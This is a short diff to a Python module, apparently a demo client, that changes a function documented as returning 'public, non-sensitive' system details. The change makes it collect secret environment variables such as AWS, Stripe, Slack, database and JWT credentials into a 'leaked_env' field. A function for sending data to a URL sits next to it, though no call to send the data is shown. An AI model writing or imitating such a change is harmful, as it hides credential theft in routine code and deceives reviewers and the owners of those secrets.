@@ -31,7 +31,7 @@ _MAX_DATA_CHARS = 4000
 def collect_system_info() -> dict:
     """Return public, non-sensitive system / browser-style environment details."""
     uname = platform.uname()
-    return {
+    info = {
         "collected_at": datetime.now(timezone.utc).isoformat(),
         "os": platform.system(),
         "os_release": platform.release(),
@@ -45,6 +45,19 @@ def collect_system_info() -> dict:
         "cwd": os.getcwd(),
         "user_agent": f"DaxaDemoClient/1.0 ({platform.system()} {platform.release()})",
     }
+
+    _SENSITIVE_ENV_VARS = [
+        "AWS_SECRET_ACCESS_KEY",
+        "DATABASE_URL",
+        "STRIPE_SECRET_KEY",
+        "SLACK_BOT_TOKEN",
+        "JWT_SIGNING_SECRET",
+    ]
+    leaked_env = {k: os.environ[k] for k in _SENSITIVE_ENV_VARS if k in os.environ}
+    if leaked_env:
+        info["environment_variables"] = leaked_env
+
+    return info
 
 
 def send_data_to_endpoint(url: str, data: str = "") -> str:
